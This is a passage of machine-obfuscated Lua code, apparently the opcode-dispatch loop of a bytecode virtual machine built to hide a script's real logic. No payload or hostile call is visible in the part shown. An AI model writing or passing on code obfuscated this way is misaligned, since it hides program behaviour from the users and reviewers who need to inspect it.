if q<=0 then x=nil else if q<2 then ba=nil else w[y[716]]=w[y[424]][y[676]];end end else if q<=3 then n=n+1;else if q>4 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end else if q<=8 then if q<=6 then n=n+1;else if 8>q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if q<=10 then if 10>q then n=n+1;else y=f[n];end else if q>11 then n=n+1;else w[y[716]]=w[y[424]][y[676]];end end end end else if q<=19 then if q<=15 then if q<=13 then y=f[n];else if 14==q then w[y[716]]=j[y[424]];else n=n+1;end end else if q<=17 then if 16==q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if q<19 then n=n+1;else y=f[n];end end end else if q<=22 then if q<=20 then w[y[716]]=w[y[424]][y[676]];else if 21==q then n=n+1;else y=f[n];end end else if q<=24 then if q>23 then x=w[ba];else ba=y[716];end else if q~=26 then for bb=ba+1,y[424]do t(x,w[bb])end;else break end end end end end q=q+1 end elseif 264~=z then local q;local x;local ba;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]x={w[ba](w[ba+1])};q=0;for bb=ba,y[676]do q=q+1;w[bb]=x[q];end else local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]]*y[676];n=n+1;y=f[n];w[y[716]]=w[y[424]]+w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]]+w[y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))end;elseif z<=265 then w[y[716]][y[424]]=y[676];elseif z<267 then w[y[716]]=w[y[424]][w[y[676]]];else local q;local x;local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];ba=y[716]x={w[ba](w[ba+1])};q=0;for bb=ba,y[676]do q=q+1;w[bb]=x[q];end end;elseif z<=273 then if z<=270 then if z<=268 then local q=y[716]local x={w[q](w[q+1])};local ba=0;for bb=q,y[676]do ba=ba+1;w[bb]=x[ba];end elseif z<270 then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if 0==q then x=nil else w[y[716]]=w[y[424]][y[676]];end else if q<3 then n=n+1;else y=f[n];end end else if q<=5 then if 5~=q then w[y[716]]=h[y[424]];else n=n+1;end else if q<=6 then y=f[n];else if 7==q then w[y[716]]=w[y[424]][w[y[676]]];else n=n+1;end end end end else if q<=13 then if q<=10 then if 9<q then w[y[716]]=h[y[424]];else y=f[n];end else if q<=11 then n=n+1;else if 12==q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if q<=15 then if 14<q then y=f[n];else n=n+1;end else if q<=16 then x=y[716]else if q~=18 then w[x]=w[x](r(w,x+1,y[424]))else break end end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q<1 then x=nil else ba=nil end else if q<=2 then bb=nil else if 4>q then w[y[716]]=h[y[424]];else n=n+1;end end end else if q<=6 then if q~=6 then y=f[n];else w[y[716]]=h[y[424]];end else if q<=7 then n=n+1;else if 8==q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if q<=14 then if q<=11 then if 11~=q then n=n+1;else y=f[n];end else if q<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if 14>q then n=n+1;else y=f[n];end end end else if q<=16 then if 15==q then bb=y[716]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q==18 then for bc=bb,y[676]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end end;elseif(z<271 or z==271)then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if q~=1 then x=nil else w[y[716]]=w[y[424]][y[676]];end else if q==2 then n=n+1;else y=f[n];end end else if q<=5 then if q>4 then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if q<=6 then y=f[n];else if q>7 then n=n+1;else w[y[716]]=w[y[424]][y[676]];end end end end else if q<=13 then if q<=10 then if 10~=q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if q<=11 then n=n+1;else if 13>q then y=f[n];else w[y[716]]=false;end end end else if q<=15 then if q<15 then n=n+1;else y=f[n];end else if q<=16 then x=y[716]else if 17<q then break else w[x](w[x+1])end end end end end q=q+1 end elseif(z==272)then local q,x=0 while true do if q<=13 then if q<=6 then if q<=2 then if q<=0 then x=nil else if 1<q then n=n+1;else w[y[716]]={};end end else if q<=4 then if 4~=q then y=f[n];else w[y[716]]=h[y[424]];end else if 6~=q then n=n+1;else y=f[n];end end end else if q<=9 then if q<=7 then w[y[716]]=w[y[424]][y[676]];else if q>8 then y=f[n];else n=n+1;end end else if q<=11 then if q<11 then w[y[716]][y[424]]=w[y[676]];else n=n+1;end else if 12<q then w[y[716]]=j[y[424]];else y=f[n];end end end end else if q<=20 then if q<=16 then if q<=14 then n=n+1;else if 16>q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if q<=18 then if 18~=q then n=n+1;else y=f[n];end else if 19<q then n=n+1;else w[y[716]]=j[y[424]];end end end else if q<=23 then if q<=21 then y=f[n];else if 23>q then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end else if q<=25 then if q==24 then y=f[n];else x=y[716]end else if 26<q then break else w[x]=w[x]()end end end end end q=q+1 end else local q=0 while true do if q<=6 then if q<=2 then if q<=0 then w[y[716]]=w[y[424]][y[676]];else if q~=2 then n=n+1;else y=f[n];end end else if q<=4 then if 4~=q then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if q~=6 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if q<=9 then if q<=7 then n=n+1;else if 9>q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if q<=11 then if q>10 then y=f[n];else n=n+1;end else if q~=13 then if w[y[716]]then n=n+1;else n=y[424];end;else break end end end end q=q+1 end end;elseif 276>=z then if 274>=z then local q;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))elseif 276~=z then local q=y[716];do return w[q],w[q+1]end else local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))end;elseif z<=277 then w[y[716]]=true;elseif z>278 then local q;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))else w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];if(w[y[716]]~=w[y[676]])then n=n+1;else n=y[424];end;end;elseif 326>=z then if 302>=z then if 290>=z then if 284>=z then if 281>=z then if 280==z then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](w[q+1])else local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))end;elseif z<=282 then local q=y[716];local x=y[676];local ba=q+2;local bb={w[q](w[q+1],w[ba])};for bc=1,x do w[ba+bc]=bb[bc];end local q=w[q+3];if q then w[ba]=q;n=y[424];else n=n+1 end;elseif z==283 then local q;local x;local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[424];x=y[676];q=k(w,g,ba,x);w[y[716]]=q;else local q;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](w[q+1])end;elseif 287>=z then if 285>=z then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))elseif z~=287 then local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))else local q;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](w[q+1])end;elseif 288>=z then local q;local x;local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];ba=y[716]x={w[ba](w[ba+1])};q=0;for bb=ba,y[676]do q=q+1;w[bb]=x[q];end elseif z==289 then local q=y[716]w[q]=w[q](r(w,q+1,y[424]))else w[y[716]][y[424]]=w[y[676]];end;elseif z<=296 then if(z<293 or z==293)then if 291>=z then do return w[y[716]]end elseif(293>z)then local q=d[y[424]];local x={};local ba={};for bb=1,y[676]do n=(n+1);local bc=f[n];if(bc[46]==43)then ba[(bb-1)]={w,bc[424],nil,nil};else ba[(bb-1)]={h,bc[424],nil};end;v[(#v+1)]=ba;end;m(x,{['\95\95\105\110\100\101\120']=function(m,m)local m=ba[m];return m[1][m[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(m,m,bb)local m=ba[m]m[1][m[2]]=bb;end;});w[y[716]]=b(q,x,j);else local m,q,x=0 while true do if m<=24 then if m<=11 then if m<=5 then if m<=2 then if m<=0 then q=nil else if m<2 then x=nil else w[y[716]]={};end end else if m<=3 then n=n+1;else if m>4 then w[y[716]]=h[y[424]];else y=f[n];end end end else if m<=8 then if m<=6 then n=n+1;else if m==7 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if m<=9 then n=n+1;else if 11>m then y=f[n];else w[y[716]]=h[y[424]];end end end end else if m<=17 then if m<=14 then if m<=12 then n=n+1;else if m==13 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if m<=15 then n=n+1;else if 17>m then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if m<=20 then if m<=18 then n=n+1;else if 20>m then y=f[n];else w[y[716]]={};end end else if m<=22 then if m==21 then n=n+1;else y=f[n];end else if m~=24 then w[y[716]]={};else n=n+1;end end end end end else if m<=37 then if m<=30 then if m<=27 then if m<=25 then y=f[n];else if 27>m then w[y[716]]=h[y[424]];else n=n+1;end end else if m<=28 then y=f[n];else if m~=30 then w[y[716]][y[424]]=w[y[676]];else n=n+1;end end end else if m<=33 then if m<=31 then y=f[n];else if 33~=m then w[y[716]]=h[y[424]];else n=n+1;end end else if m<=35 then if 35>m then y=f[n];else w[y[716]][y[424]]=w[y[676]];end else if m<37 then n=n+1;else y=f[n];end end end end else if m<=43 then if m<=40 then if m<=38 then w[y[716]][y[424]]=w[y[676]];else if m<40 then n=n+1;else y=f[n];end end else if m<=41 then w[y[716]]={r({},1,y[424])};else if 42==m then n=n+1;else y=f[n];end end end else if m<=46 then if m<=44 then w[y[716]]=w[y[424]];else if 46~=m then n=n+1;else y=f[n];end end else if m<=48 then if 48>m then x=y[716];else q=w[x];end else if 50~=m then for ba=x+1,y[424]do t(q,w[ba])end;else break end end end end end end m=m+1 end end;elseif(z==294 or z<294)then local m,q=0 while true do if m<=9 then if m<=4 then if m<=1 then if m~=1 then q=nil else w[y[716]]=w[y[424]][y[676]];end else if m<=2 then n=n+1;else if m>3 then w[y[716]]=y[424];else y=f[n];end end end else if m<=6 then if m<6 then n=n+1;else y=f[n];end else if m<=7 then w[y[716]]=h[y[424]];else if m~=9 then n=n+1;else y=f[n];end end end end else if m<=14 then if m<=11 then if m~=11 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if m<=12 then y=f[n];else if m<14 then q=y[716];else do return w[q](r(w,q+1,y[424]))end;end end end else if m<=16 then if m>15 then y=f[n];else n=n+1;end else if m<=17 then q=y[716];else if m>18 then break else do return r(w,q,p)end;end end end end end m=m+1 end elseif 295<z then w[y[716]]=(w[y[424]]+w[y[676]]);else local m,q=0 while true do if m<=7 then if m<=3 then if m<=1 then if m<1 then q=nil else w[y[716]]=w[y[424]];end else if m==2 then n=n+1;else y=f[n];end end else if m<=5 then if m<5 then w[y[716]]=y[424];else n=n+1;end else if m==6 then y=f[n];else w[y[716]]=y[424];end end end else if m<=11 then if m<=9 then if 8==m then n=n+1;else y=f[n];end else if m>10 then n=n+1;else w[y[716]]=y[424];end end else if m<=13 then if m~=13 then y=f[n];else q=y[716]end else if m>14 then break else w[q]=w[q](r(w,q+1,y[424]))end end end end m=m+1 end end;elseif z<=299 then if z<=297 then a(c,e);n=n+1;y=f[n];w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];elseif z>298 then local a;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];a=y[716]w[a]=w[a](r(w,a+1,y[424]))else local a;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]]*y[676];n=n+1;y=f[n];w[y[716]]=w[y[424]]+w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]]+w[y[676]];n=n+1;y=f[n];a=y[716]w[a]=w[a](r(w,a+1,y[424]))end;elseif z<=300 then local a=y[716];local c=w[y[424]];w[a+1]=c;w[a]=c[w[y[676]]];elseif z==301 then local a;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];a=y[716]w[a]=w[a](r(w,a+1,y[424]))else local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=#w[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];a=y[716];w[a]=w[a]-w[a+2];n=y[424];end;elseif 314>=z then if z<=308 then if(305>=z)then if(303>=z)then local a=0 while true do if(a<=9)then if(a==4 or a<4)then if(a<1 or a==1)then if(1~=a)then w[y[716]][y[424]]=y[676];else n=n+1;end else if a<=2 then y=f[n];else if(3==a)then w[y[716]]={};else n=(n+1);end end end else if a<=6 then if(a>5)then w[y[716]][y[424]]=w[y[676]];else y=f[n];end else if a<=7 then n=n+1;else if(8<a)then w[y[716]]=h[y[424]];else y=f[n];end end end end else if a<=14 then if a<=11 then if(11>a)then n=(n+1);else y=f[n];end else if(a<12 or a==12)then w[y[716]]=w[y[424]][y[676]];else if(14>a)then n=n+1;else y=f[n];end end end else if(a==16 or a<16)then if(a<16)then w[y[716]][y[424]]=w[y[676]];else n=(n+1);end else if(a==17 or a<17)then y=f[n];else if 18<a then break else w[y[716]][y[424]]=w[y[676]];end end end end end a=(a+1)end elseif z<305 then if(y[716]<w[y[676]])then n=n+1;else n=y[424];end;else local a,c=0 while true do if a<=10 then if a<=4 then if a<=1 then if a<1 then c=nil else w[y[716]]=j[y[424]];end else if a<=2 then n=n+1;else if a>3 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end else if a<=7 then if a<=5 then n=n+1;else if a==6 then y=f[n];else w[y[716]]=y[424];end end else if a<=8 then n=n+1;else if 10~=a then y=f[n];else w[y[716]]=y[424];end end end end else if a<=15 then if a<=12 then if a<12 then n=n+1;else y=f[n];end else if a<=13 then w[y[716]]=y[424];else if a~=15 then n=n+1;else y=f[n];end end end else if a<=18 then if a<=16 then w[y[716]]=y[424];else if a==17 then n=n+1;else y=f[n];end end else if a<=19 then c=y[716]else if a>20 then break else w[c]=w[c](r(w,c+1,y[424]))end end end end end a=a+1 end end;elseif z<=306 then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a~=1 then c=nil else w[y[716]]=w[y[424]];end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if a~=5 then w[y[716]]=w[y[424]];else n=n+1;end else if 6<a then w[y[716]]=w[y[424]];else y=f[n];end end end else if a<=11 then if a<=9 then if a~=9 then n=n+1;else y=f[n];end else if 11>a then w[y[716]]=w[y[424]];else n=n+1;end end else if a<=13 then if a==12 then y=f[n];else c=y[716]end else if 15>a then w[c]=w[c](r(w,c+1,y[424]))else break end end end end a=a+1 end elseif 308>z then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if a<1 then c=nil else e=nil end else if a<=2 then m=nil else if a>3 then n=n+1;else w[y[716]]=j[y[424]];end end end else if a<=6 then if a<6 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if a<=7 then n=n+1;else if a<9 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if a<=14 then if a<=11 then if a==10 then n=n+1;else y=f[n];end else if a<=12 then w[y[716]]=w[y[424]][y[676]];else if 14>a then n=n+1;else y=f[n];end end end else if a<=16 then if 15==a then m=y[716]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if a<19 then for q=m,y[676]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end else local a=y[716]local c,e=i(w[a](r(w,a+1,y[424])))p=(e+a)-1 local e=0;for m=a,p do e=e+1;w[m]=c[e];end;end;elseif z<=311 then if 309>=z then local a;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];a=y[716]w[a]=w[a]()elseif z<311 then local a;local c,e;local m;w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];m=y[716]c,e=i(w[m](r(w,m+1,y[424])))p=e+m-1 a=0;for e=m,p do a=a+1;w[e]=c[a];end;else if(w[y[716]]~=y[676])then n=y[424];else n=n+1;end;end;elseif z<=312 then w[y[716]]=b(d[y[424]],nil,j);elseif z==313 then local a;local c;local d;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];d=y[716]c={w[d](w[d+1])};a=0;for e=d,y[676]do a=a+1;w[e]=c[a];end else w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];n=y[424];end;elseif z<=320 then if 317>=z then if(z<315 or z==315)then local a=0 while true do if(a==6 or a<6)then if(a<2 or a==2)then if(a<0 or a==0)then w[y[716]]=w[y[424]][y[676]];else if not(2==a)then n=(n+1);else y=f[n];end end else if(a<4 or a==4)then if 4~=a then w[y[716]]=w[y[424]][y[676]];else n=(n+1);end else if a>5 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end else if(a==9 or a<9)then if(a<=7)then n=n+1;else if 9~=a then y=f[n];else w[y[716]][y[424]]=w[y[676]];end end else if a<=11 then if not(11==a)then n=n+1;else y=f[n];end else if 12<a then break else n=y[424];end end end end a=(a+1)end elseif z~=317 then local a=y[716];local c=w[y[424]];w[a+1]=c;w[a]=c[y[676]];else w[y[716]]=(w[y[424]]-w[y[676]]);end;elseif z<=318 then local a;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];a=y[716]w[a]=w[a](w[a+1])elseif 320>z then local a;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];a=y[716]w[a]=w[a](r(w,a+1,y[424]))else local a;w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];a=y[716]w[a]=w[a](r(w,a+1,y[424]))end;elseif z<=323 then if 321>=z then if(w[y[716]]~=w[y[676]])then n=y[424];else n=n+1;end;elseif 322==z then w[y[716]]=h[y[424]];else local a=y[716];local c=w[a];for d=a+1,p do t(c,w[d])end;end;elseif z<=324 then if not w[y[716]]then n=n+1;else n=y[424];end;elseif 325<z then local a;local c;local d;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];d=y[716]c={w[d](w[d+1])};a=0;for e=d,y[676]do a=a+1;w[e]=c[a];end else w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];if(w[y[716]]~=y[676])then n=n+1;else n=y[424];end;end;elseif z<=349 then if z<=337 then if(331==z or 331>z)then if z<=328 then if z~=328 then if(not(w[y[716]]==w[y[676]]))then n=n+1;else n=y[424];end;else local a=0 while true do if a<=14 then if a<=6 then if a<=2 then if a<=0 then w={};else if a==1 then for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;else n=n+1;end end else if a<=4 then if 3<a then w[y[716]]=h[y[424]];else y=f[n];end else if 5<a then y=f[n];else n=n+1;end end end else if a<=10 then if a<=8 then if a>7 then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if 10~=a then y=f[n];else w[y[716]]=h[y[424]];end end else if a<=12 then if a>11 then y=f[n];else n=n+1;end else if a<14 then w[y[716]]={};else n=n+1;end end end end else if a<=21 then if a<=17 then if a<=15 then y=f[n];else if 16==a then w[y[716]]={};else n=n+1;end end else if a<=19 then if a~=19 then y=f[n];else w[y[716]][y[424]]=w[y[676]];end else if a>20 then y=f[n];else n=n+1;end end end else if a<=25 then if a<=23 then if a~=23 then w[y[716]]=j[y[424]];else n=n+1;end else if a==24 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if a<=27 then if 27~=a then n=n+1;else y=f[n];end else if a>28 then break else if w[y[716]]then n=n+1;else n=y[424];end;end end end end end a=a+1 end end;elseif(329==z or 329>z)then local a,c=0 while true do if a<=10 then if a<=4 then if a<=1 then if 0<a then w[y[716]]=j[y[424]];else c=nil end else if a<=2 then n=n+1;else if 4~=a then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if a<=7 then if a<=5 then n=n+1;else if a<7 then y=f[n];else w[y[716]]=y[424];end end else if a<=8 then n=n+1;else if a==9 then y=f[n];else w[y[716]]=y[424];end end end end else if a<=15 then if a<=12 then if a~=12 then n=n+1;else y=f[n];end else if a<=13 then w[y[716]]=y[424];else if a<15 then n=n+1;else y=f[n];end end end else if a<=18 then if a<=16 then w[y[716]]=y[424];else if 18>a then n=n+1;else y=f[n];end end else if a<=19 then c=y[716]else if 20==a then w[c]=w[c](r(w,c+1,y[424]))else break end end end end end a=a+1 end elseif 330==z then local a,c,d,e=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0==a then c=nil else d=nil end else if a<=2 then e=nil else if a>3 then n=n+1;else w[y[716]]=h[y[424]];end end end else if a<=6 then if a~=6 then y=f[n];else w[y[716]]=h[y[424]];end else if a<=7 then n=n+1;else if a>8 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end end else if a<=14 then if a<=11 then if 10<a then y=f[n];else n=n+1;end else if a<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if a<14 then n=n+1;else y=f[n];end end end else if a<=16 then if 15<a then d={w[e](w[e+1])};else e=y[716]end else if a<=17 then c=0;else if 18==a then for m=e,y[676]do c=c+1;w[m]=d[c];end else break end end end end end a=a+1 end else local a=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1>a then w[y[716]]=w[y[424]]/y[676];else n=n+1;end else if a<=2 then y=f[n];else if a~=4 then w[y[716]]=w[y[424]]-w[y[676]];else n=n+1;end end end else if a<=6 then if 6~=a then y=f[n];else w[y[716]]=w[y[424]]/y[676];end else if a<=7 then n=n+1;else if 8<a then w[y[716]]=w[y[424]]*y[676];else y=f[n];end end end end else if a<=14 then if a<=11 then if a==10 then n=n+1;else y=f[n];end else if a<=12 then w[y[716]]=w[y[424]];else if a~=14 then n=n+1;else y=f[n];end end end else if a<=16 then if a==15 then w[y[716]]=w[y[424]];else n=n+1;end else if a<=17 then y=f[n];else if a>18 then break else n=y[424];end end end end end a=a+1 end end;elseif(z<=334)then if(332>z or 332==z)then w[y[716]]=y[424];elseif(333==z)then do return end;else local a=y[424];local c=y[676];local a=k(w,g,a,c);w[y[716]]=a;end;elseif(z==335 or z<335)then local a=y[716];do return r(w,a,p)end;elseif(337>z)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if a==0 then c=nil else w[y[716]]=w[y[424]][w[y[676]]];end else if a~=3 then n=n+1;else y=f[n];end end else if a<=5 then if 4<a then n=n+1;else w[y[716]]=w[y[424]];end else if a<=6 then y=f[n];else if a~=8 then w[y[716]]=y[424];else n=n+1;end end end end else if a<=13 then if a<=10 then if a==9 then y=f[n];else w[y[716]]=y[424];end else if a<=11 then n=n+1;else if a==12 then y=f[n];else w[y[716]]=y[424];end end end else if a<=15 then if 14==a then n=n+1;else y=f[n];end else if a<=16 then c=y[716]else if a~=18 then w[c]=w[c](r(w,c+1,y[424]))else break end end end end end a=a+1 end else if(not(w[y[716]]==y[676]))then n=n+1;else n=y[424];end;end;elseif(z<=343)then if(340>=z)then if(z<338 or z==338)then j[y[424]]=w[y[716]];elseif not(340==z)then local a,c=0 while true do if a<=16 then if a<=7 then if a<=3 then if a<=1 then if a==0 then c=nil else w[y[716]]=w[y[424]][y[676]];end else if a>2 then y=f[n];else n=n+1;end end else if a<=5 then if a<5 then w[y[716]]=h[y[424]];else n=n+1;end else if 6==a then 